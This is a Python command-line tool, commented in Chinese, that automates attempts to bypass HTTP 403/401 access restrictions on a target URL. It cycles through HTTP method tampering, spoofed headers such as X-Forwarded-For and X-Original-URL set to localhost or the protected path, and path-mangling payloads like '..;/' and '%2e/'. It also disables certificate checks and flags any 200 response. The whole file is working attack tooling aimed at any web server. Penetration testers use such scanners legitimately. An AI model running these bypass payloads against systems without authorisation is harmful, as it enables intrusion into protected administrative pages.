import requests
import argparse
import urllib3
from urllib.parse import urlparse

# 忽略 SSL 警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class BypassScanner:
    def __init__(self, target_url):
        self.target = target_url.rstrip('/')
        self.path = urlparse(target_url).path
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AF-Service-Scanner/1.0"
        }

    def scan(self):
        print(f"[*] Starting Bypass Scan for: {self.target}\n")
        
        # 1. 谓词篡改 (Verb Tampering)
        methods = ["GET", "POST", "HEAD", "PUT", "TRACE", "OPTIONS"]
        for m in methods:
            self._request(m, self.target, title=f"Method: {m}")

        # 2. Header 注入
        bypass_headers = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"X-Original-URL": self.path},
            {"X-Rewrite-URL": self.path},
            {"X-Remote-IP": "127.0.0.1"},
            {"X-Host": "127.0.0.1"}
        ]
        for h in bypass_headers:
            self._request("GET", self.target, headers=h, title=f"Header: {list(h.keys())[0]}")

        # 3. 路径变形 (Path Fuzzing)
        # 包含你提到的 ..;/ 和 ../
        path_payloads = [
            f"{self.target}/",
            f"{self.target}/.",
            f"{self.target}..;/",
            f"{self.target}/..;/",
            f"{self.target}/%2e/",
            f"{self.target}//",
            f"{self.target}.json"
        ]
        for p in path_payloads:
            self._request("GET", p, title=f"Path: {p.replace(self.target, '')}")

    def _request(self, method, url, headers=None, title=""):
        test_headers = self.headers.copy()
        if headers:
            test_headers.update(headers)
        
        try:
            resp = requests.request(method, url, headers=test_headers, verify=False, timeout=5, allow_redirects=False)
            color = "\033[92m" if resp.status_code == 200 else "\033[90m"
            print(f"{color}[{resp.status_code}] {title} \033[0m")
        except Exception as e:
            print(f"[!] Error on {title}: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="403/401 Bypass Automation Tool")
    parser.add_argument("-u", "--url", required=True, help="Target URL (e.g., https://example.com/admin)")
    args = parser.parse_args()

    scanner = BypassScanner(args.url)
    scanner.scan()